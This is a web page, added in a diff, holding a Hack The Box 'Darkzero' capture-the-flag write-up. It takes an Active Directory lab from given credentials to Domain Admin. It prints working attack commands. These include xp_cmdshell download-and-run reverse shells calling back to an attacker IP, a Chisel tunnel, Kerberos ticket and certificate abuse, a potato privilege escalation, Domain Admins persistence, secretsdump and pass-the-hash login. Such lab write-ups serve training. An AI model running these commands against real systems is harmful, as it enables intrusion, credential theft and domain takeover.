@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Darkzero | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Active Directory</p>
+      <h1>HTB Darkzero</h1>
+      <p class="headline">MSSQL links, Kerberos certificate abuse, token impersonation and unconstrained delegation</p>
+      <p class="meta">Hard - Domain Admin</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Darkzero begins with valid credentials for <code>john.w</code>. MSSQL access exposes a linked SQL server, where <code>xp_cmdshell</code> provides command execution on a second domain controller. A reverse shell and Chisel tunnel make the internal host reachable. Kerberos ticket delegation and certificate abuse are then used to gain stronger control over <code>svc_sql</code>. After local privilege escalation to SYSTEM on DC02, unconstrained delegation is abused to capture a DC01 machine ticket and dump the Administrator hash from the primary domain controller.</p>
+<h2>Initial Credentials and MSSQL Access</h2>
+<pre><code class="language-text">john.w / RFulUtONCOL!</code></pre>
+<p>Port scanning showed a Windows Active Directory environment with MSSQL and WinRM exposed.</p>
+<pre><code class="language-bash">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.64.24 -oG allPorts</code></pre>
+<p>After adding <code>darkzero.htb</code> and <code>DC01.darkzero.htb</code> to <code>/etc/hosts</code>, MSSQL authentication succeeded.</p>
+<pre><code class="language-bash">mssqlclient.py -windows-auth &#39;darkzero.htb&#39;/&#39;john.w&#39;:&#39;RFulUtONCOL!&#39;@10.129.64.24</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507195215.png" alt="MSSQL port identified" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507195522.png" alt="Valid credentials confirmed" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507210133.png" alt="MSSQL login" /></figure>
+<h2>Linked SQL Server and Reverse Shell</h2>
+<p>SQL links revealed access to <code>DC02.darkzero.ext</code>.</p>
+<pre><code class="language-sql">enum_links
+use_link &quot;DC02.darkzero.ext&quot;
+enable_xp_cmdshell</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507210446.png" alt="MSSQL links enumeration" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507210747.png" alt="Using DC02 SQL link" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507210936.png" alt="xp_cmdshell enabled" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507211051.png" alt="Command execution test" /></figure>
+<p>A PowerShell reverse shell was executed through <code>xp_cmdshell</code>.</p>
+<pre><code class="language-sql">xp_cmdshell powershell iex(iwr -uri http://10.10.17.23/revshell.ps1 -UseBasicParsing)</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507212317.png" alt="Reverse shell preparation" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507213250.png" alt="xp_cmdshell reverse shell execution" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507213423.png" alt="Shell callback" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507213756.png" alt="Initial shell context" /></figure>
+<h2>Pivoting and Kerberos Material</h2>
+<p>Because DC02 was internal, Chisel was used to create a reverse SOCKS tunnel.</p>
+<pre><code class="language-bash">./chisel server --reverse -p 8080
+iwr -uri http://10.10.17.23/chisel.exe -o C:\windows\tasks\chisel.exe
+Start-Process &quot;C:\windows\tasks\chisel.exe&quot; -ArgumentList &quot;client 10.10.17.23:8080 R:socks&quot;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507214857.png" alt="Chisel server" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507215231.png" alt="Chisel download on victim" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507220145.png" alt="Chisel client execution" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507220324.png" alt="Proxychains session" /></figure>
+<p>Rubeus was used to obtain a delegated TGT for <code>svc_sql</code>, which was converted to a ccache.</p>
+<pre><code class="language-cmd">C:\windows\tasks\Rubeus.exe tgtdeleg /nowrap</code></pre>
+<pre><code class="language-bash">cat svc_sql.kirbi.b64 | base64 -d &gt; svc_sql.kirbi
+ticketConverter.py svc_sql.kirbi svc_sql.ccache
+export KRB5CCNAME=svc_sql.ccache</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507221037.png" alt="Rubeus upload" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507221238.png" alt="tgtdeleg output" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507221708.png" alt="Kirbi extraction" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507221903.png" alt="Ticket conversion" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507222031.png" alt="KRB5CCNAME export" /></figure>
+<h2>Certificate Abuse and Password Reset</h2>
+<p>Using the Kerberos ticket, a certificate was requested from the CA on DC02.</p>
+<pre><code class="language-bash">proxychains certipy req -u svc_sql -k -no-pass -target DC02.darkzero.ext -ca &#39;darkzero-ext-DC02-CA&#39; -template &#39;user&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507224857.png" alt="Certificate request as svc_sql" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507225234.png" alt="svc_sql NTLM recovered" /></figure>
+<p>The <code>svc_sql</code> password was reset to a known value.</p>
+<pre><code class="language-bash">python3 -c &#39;import hashlib,binascii; print(binascii.hexlify(hashlib.new(&quot;md4&quot;,&quot;Password1!&quot;.encode(&quot;utf-16le&quot;)).digest()).decode())&#39;
+proxychains changepasswd.py -hashes :816ccb849956b531db139346751db65f -newhash :7facdc498ed1680c4fd1448319a8c04f &#39;darkzero.ext/svc_sql&#39;@dc02.darkzero.ext</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507225624.png" alt="New NT hash for Password1" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507230055.png" alt="Password change" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260507230345.png" alt="Password validation" /></figure>
+<h2>SYSTEM on DC02 and Domain Admin Persistence</h2>
+<p><code>Invoke-RunasCs</code> was used to get a better session as <code>svc_sql</code>.</p>
+<pre><code class="language-powershell">Invoke-RunasCs -Username svc_sql -Password &#39;Password1!&#39; -LogonType 5 -BypassUAC -Command powershell.exe -Remote 10.10.17.23:1337</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508121733.png" alt="RunasCs listener" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508121819.png" alt="RunasCs execution" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508122215.png" alt="Impersonation privileges" /></figure>
+<p>SharpEfsPotato was then used to obtain SYSTEM on DC02.</p>
+<pre><code class="language-cmd">C:\Windows\Tasks\SharpEfsPotato.exe -a &#39;/c powershell.exe -c IEX(iwr -uri http://10.10.17.23/revshell.ps1 -UseBasicParsing)&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508123637.png" alt="SharpEfsPotato upload" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508125728.png" alt="SharpEfsPotato execution" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508125841.png" alt="SYSTEM shell on DC02" /></figure>
+<p>The account was added to Domain Admins.</p>
+<pre><code class="language-cmd">net group &quot;Domain Admins&quot; svc_sql /add /domain</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508130419.png" alt="Domain Admins persistence" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508130830.png" alt="Domain Admin validation" /></figure>
+<h2>Unconstrained Delegation to DC01</h2>
+<p>From DC02, Rubeus monitor captured a DC01 machine TGT after coercing authentication from DC01 via MSSQL <code>xp_dirtree</code>.</p>
+<pre><code class="language-cmd">C:\Windows\Tasks\rubeus.exe monitor /interval:5 /nowrap</code></pre>
+<pre><code class="language-sql">xp_dirtree \\dc02.darkzero.ext\c$</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508132039.png" alt="Stable psexec session" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508133346.png" alt="Rubeus monitor" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508133822.png" alt="Coercing DC01 authentication" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508133919.png" alt="Captured DC01 TGT" /></figure>
+<p>The TGT was converted and used with SecretsDump to obtain the Administrator hash.</p>
+<pre><code class="language-bash">cat DC01\$.kirbi.b64 | base64 -d &gt; DC01$.kirbi
+ticketConverter.py DC01$.kirbi DC01$.ccache
+export KRB5CCNAME=DC01\$.ccache
+secretsdump.py -just-dc-user Administrator -k dc01.darkzero.htb</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508134224.png" alt="DC01 ticket conversion" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508134716.png" alt="Administrator hash from DC01" /></figure>
+<p>The final Administrator hash allowed WinRM access to DC01.</p>
+<pre><code class="language-bash">evil-winrm -i 10.129.64.87 -u &#39;Administrator&#39; -H &#39;5917507bdf2ef2c2b0a869a1cba40726&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508134929.png" alt="Administrator shell on DC01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/darkzero/Pasted%20image%2020260508135128.png" alt="Flags recovered" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>MSSQL links can provide a bridge between isolated systems.</li>
+<li>Reverse tunnels are often required to operate inside segmented networks.</li>
+<li>Kerberos ticket conversion enables Linux tooling against Windows internal infrastructure.</li>
+<li>Unconstrained delegation can turn machine account coercion into full domain compromise.</li>
+</ul>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
